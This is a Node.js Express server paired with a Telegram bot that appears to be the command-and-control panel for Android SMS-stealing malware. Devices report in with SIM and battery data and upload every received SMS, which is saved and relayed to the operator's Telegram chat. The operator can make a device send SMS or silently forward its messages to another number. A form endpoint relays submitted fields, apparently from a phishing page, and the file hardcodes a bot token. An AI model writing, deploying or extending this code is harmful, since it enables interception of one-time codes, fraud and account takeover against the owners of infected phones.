const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');
const path = require('path');

// ===== CONFIG =====
const BOT_TOKEN = '8197634171:AAEECSJXo6RkixQiS2kpYLbV0RiK3w2hXkA';
const ADMIN_IDS = [-1003002765398]; // Replace with group/chat ID
const PORT = 3000;
const DEVELOPER = '@ydkhgmmt';
const STATUS_INTERVAL = 60 * 1000; // 1 min refresh
const FORM_URL = 'https://sms-37l6.onrender.com'; // Added Form URL

// ===== STORAGE =====
const STORAGE_DIR = path.join(__dirname, 'storage');
fs.ensureDirSync(STORAGE_DIR);
const QUEUE_FILE = path.join(STORAGE_DIR, 'commandQueue.json');
if (!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE, {});

// ===== APP =====
const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'form')));

// ===== BOT =====
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ===== RUNTIME =====
const devices = new Map();
const sessions = {};
const notifiedDevices = new Set();
let lastStatusMessageId = null;

// ===== UTILS =====
function readQueue() { return fs.readJsonSync(QUEUE_FILE, { throws: false }) || {}; }
function writeQueue(q) { fs.writeJsonSync(QUEUE_FILE, q, { spaces: 2 }); }
function addCommand(uuid, cmd) {
  const q = readQueue();
  q[uuid] = q[uuid] || [];
  q[uuid].push(cmd);
  writeQueue(q);
}
function isAdmin(chatId) { return ADMIN_IDS.includes(chatId); }
function formatDevice(d) {
  const online = (Date.now() - (d.lastSeen || 0) < 60000);
  return `📱 *${d.Device || 'Unknown'}*\n🪪 SIM1: ${d.sim1 || 'N/A'} | 🪪 SIM2: ${d.sim2 || 'N/A'}\n🔋 ${d.battery || 'N/A'}%
🌐 ${online ? '🟢 Online' : '🔴 Offline'}`;
}

// ===== EXPRESS ROUTES =====
app.post('/connect', (req, res) => {
  const { uuid, Device, battery, sim1, sim2 } = req.body;
  if (!uuid) return res.status(400).send('missing uuid');

  const existingDevice = devices.get(uuid);
  const wasOffline = !existingDevice || existingDevice.notifiedState === 'offline';

  const deviceData = {
    Device,
    battery,
    sim1,
    sim2,
    lastSeen: Date.now(),
    notifiedState: 'online' // Start with online state
  };
  devices.set(uuid, deviceData);

  if (wasOffline) {
    const message = `🟢 *Device Connected*
${formatDevice(deviceData)}`;
    ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
  }

  res.sendStatus(200);
});

app.get('/commands', (req, res) => {
  const uuid = req.query.uuid;
  if (!uuid) return res.status(400).send('missing uuid');
  const q = readQueue();
  const cmds = q[uuid] || [];
  q[uuid] = [];
  writeQueue(q);
  res.json(cmds);
});

app.post('/sms', (req, res) => {
  const { uuid, from, body, sim, timestamp, battery } = req.body;
  if (!uuid || !from || !body) return res.status(400).send('missing fields');

  const device = devices.get(uuid) || { Device: uuid, sim1: 'N/A', sim2: 'N/A' };
  const ts = new Date(timestamp || Date.now());

  // Save SMS
  const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
  const list = fs.existsSync(smsFile) ? fs.readJsonSync(smsFile) : [];
  list.unshift({ from, body, sim, battery, timestamp: ts.getTime() });
  fs.writeJsonSync(smsFile, list.slice(0, 500), { spaces: 2 });

  // Notify admin
  const smsMsg = `📱 *NEW SMS* (${device.Device})
From: ${from}
SIM: ${sim}
Time: ${ts.toLocaleTimeString()}
Message:
${body}`;
  ADMIN_IDS.forEach(id => bot.sendMessage(id, smsMsg, { parse_mode: 'Markdown' }));
  res.sendStatus(200);
});

app.post('/html-form-data', (req, res) => {
  const data = req.body;
  let message = '📝 *New Form Submission*

';
  for (const [key, value] of Object.entries(data)) {
    message += `*${key.replace(/_/g, ' ').toUpperCase()}*: ${value}
`;
  }
  ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
  res.sendStatus(200);
});

// ===== TELEGRAM HANDLER =====
bot.on('message', async msg => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  if (!isAdmin(chatId)) return bot.sendMessage(chatId, '❌ Permission denied.');

  const s = sessions[chatId];
  if (s?.stage) {
    if (s.stage === 'await_sms_number') {
      s.number = text;
      s.stage = 'await_sms_body';
      return bot.sendMessage(chatId, '✍️ Enter SMS message text:');
    }
    if (s.stage === 'await_sms_body') {
      addCommand(s.uuid, { type: 'send_sms', sim: s.sim, number: s.number, message: text });
      bot.sendMessage(chatId, `✅ SMS SENT
Device: ${devices.get(s.uuid)?.Device}
SIM${s.sim} → ${s.number}
✉️ Message: ${text}`);
      delete sessions[chatId];
      return;
    }
    if (s.stage === 'await_forward_number') {
      addCommand(s.uuid, { type: 'sms_forward', action: 'on', sim: s.sim, number: text });
      bot.sendMessage(chatId, `✅ SMS Forward enabled for SIM${s.sim} → ${text}`);
      delete sessions[chatId];
      return;
    }
  }

  if (text === '/start') {
    return bot.sendMessage(chatId, '✅ Admin Panel Ready', {
      reply_markup: { keyboard: [['Connected devices']], resize_keyboard: true }
    });
  }

  if (text === 'Connected devices') {
    if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.Device, callback_data: `device_menu:${uuid}` }]);
    return bot.sendMessage(chatId, '📱 Select a device:', { reply_markup: { inline_keyboard: rows } });
  }
});

// ===== CALLBACKS =====
bot.on('callback_query', cb => {
  const chatId = cb.message.chat.id;
  if (!isAdmin(chatId)) return bot.answerCallbackQuery(cb.id, { text: '❌ Not allowed' });

  const parts = cb.data.split(':');
  const cmd = parts[0];
  const uuid = parts.length > 1 ? parts[parts.length - 1] : null;
  const device = devices.get(uuid);

  if (uuid && !device) return bot.answerCallbackQuery(cb.id, { text: '❌ Device not found' });

  switch (cmd) {
    case 'device_menu':
      return bot.editMessageText(`📱 *${device.Device}* Selected
Choose an action:`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📤 Send SMS', callback_data: `send_sms:${uuid}` }],
            [{ text: '📥 Receive SMS', callback_data: `receive_sms:${uuid}` }],
            [{ text: '📡 Set Forward Number', callback_data: `set_forward_menu:${uuid}` }],
            [{ text: '🔄 Toggle Forwarding', callback_data: `toggle_forward_menu:${uuid}` }],
            [{ text: 'ℹ️ Device Info', callback_data: `device_info:${uuid}` }]
          ]
        }
      });

    case 'device_info':
      const online = (Date.now() - (device.lastSeen || 0) < 70000);
      const infoMsg = [
        `*Device Details for ${device.Device}*`,
        `*UUID*: `${uuid}``,
        `*SIM 1*: ${device.sim1 || 'N/A'}`,
        `*SIM 2*: ${device.sim2 || 'N/A'}`,
        `*Battery*: ${device.battery || 'N/A'}`,
        `*Status*: ${online ? '🟢 Online' : '🔴 Offline'}`,
        `*Form URL*: ${FORM_URL}`
      ].join('\n');
      bot.sendMessage(chatId, infoMsg, { parse_mode: 'Markdown' });
      return bot.answerCallbackQuery(cb.id);

    case 'send_sms':
      return bot.editMessageText(`Choose SIM for ${device.Device}:`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[ 
          { text: 'SIM1', callback_data: `send_sms_sim:1:${uuid}` },
          { text: 'SIM2', callback_data: `send_sms_sim:2:${uuid}` }
        ]] }
      });

    case 'send_sms_sim':
      const simToSend = parts[1];
      sessions[chatId] = { stage: 'await_sms_number', sim: simToSend, uuid };
      bot.sendMessage(chatId, `📞 Enter recipient number for SIM${simToSend}:`);
      return bot.answerCallbackQuery(cb.id);

    case 'receive_sms':
      const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
      if (!fs.existsSync(smsFile)) return bot.sendMessage(chatId, '🚫 No SMS history.');
      const list = fs.readJsonSync(smsFile).slice(0, 20);
      let out = `📜 *Last 20 SMS for ${device.Device}*
`;
      list.forEach(sms => {
        const ts = new Date(sms.timestamp);
        out += `
From: ${sms.from}
Message: ${sms.body}
SIM: ${sms.sim}
Time: ${ts.toLocaleString()}
---------------------
`;
      });
      return bot.sendMessage(chatId, out, { parse_mode: 'Markdown' });

    case 'set_forward_menu':
      return bot.editMessageText(`Set forwarding number for which SIM on ${device.Device}?`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[ 
          { text: 'SIM1', callback_data: `set_forward_action:1:${uuid}` },
          { text: 'SIM2', callback_data: `set_forward_action:2:${uuid}` }
        ]] }
      });

    case 'set_forward_action':
      const simToSet = parts[1];
      const forwardActionKeyboard = {
        inline_keyboard: [
          [
            { text: '✅ Enable/Change Number', callback_data: `enable_forward:${simToSet}:${uuid}` },
            { text: '❌ Disable Forwarding', callback_data: `disable_forward:${simToSet}:${uuid}` }
          ]
        ]
      };
      return bot.editMessageText(`Choose action for SIM ${simToSet} on ${device.Device}:`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        reply_markup: forwardActionKeyboard
      });

    case 'enable_forward':
      const simToEnable = parts[1];
      sessions[chatId] = { stage: 'await_forward_number', sim: simToEnable, uuid };
      bot.sendMessage(chatId, `📡 Enter number to forward SMS to for SIM${simToEnable}:`);
      return bot.answerCallbackQuery(cb.id);

    case 'disable_forward':
      const simToDisable = parts[1];
      addCommand(uuid, { type: 'sms_forward', action: 'off', sim: simToDisable });
      bot.editMessageText(`✅ Forwarding number removed for SIM${simToDisable} on ${device.Device}.`, {
        chat_id: chatId,
        message_id: cb.message.message_id
      });
      return bot.answerCallbackQuery(cb.id);

    case 'toggle_forward_menu':
       return bot.editMessageText(`Set global forwarding status for ${device.Device}:`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[ 
          { text: '🟢 Forwarding ON', callback_data: `forward_global:on:${uuid}` },
          { text: '🔴 Forwarding OFF', callback_data: `forward_global:off:${uuid}` }
        ]] }
      });

    case 'forward_global':
      const status = parts[1];
      addCommand(uuid, { type: 'forward_global', status: status });
      bot.editMessageText(`✅ Global SMS forwarding set to ${status.toUpperCase()} for ${device.Device}.`, {
        chat_id: chatId,
        message_id: cb.message.message_id
      });
      return bot.answerCallbackQuery(cb.id);

    default:
      return bot.answerCallbackQuery(cb.id, { text: '❌ Unknown action' });
  }
});

// ===== DEVICE OFFLINE CHECKER =====
const OFFLINE_THRESHOLD = 70 * 1000; // 70 seconds, must be greater than the app's polling interval
setInterval(() => {
  for (let [uuid, device] of devices.entries()) {
    const isOffline = (Date.now() - device.lastSeen) > OFFLINE_THRESHOLD;
    // Only notify if the state changes from online to offline
    if (isOffline && device.notifiedState === 'online') {
      device.notifiedState = 'offline';
      const message = `🔴 *Device Offline*
${formatDevice(device)}`;
      ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
    }
  }
}, 30 * 1000); // Check every 30 seconds

// ===== START SERVER =====
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
bot.getMe().then(info => console.log(`🤖 Bot started as @${info.username}`)).catch(e => console.error(e));
